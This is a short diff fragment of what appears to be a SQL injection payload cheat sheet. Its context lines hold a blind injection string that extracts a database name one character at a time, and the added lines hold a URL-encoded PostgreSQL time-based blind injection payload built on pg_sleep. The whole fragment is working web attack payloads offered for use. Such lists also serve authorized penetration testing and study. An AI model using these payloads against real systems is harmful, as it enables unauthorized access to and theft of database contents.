@@ -114,3 +114,6 @@ latest:
 
 # to find second character
 ' or (ascii(substr((select+database()),2,1))) ='1
+
+POSTGRES SQLI PAYLOAD
+'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
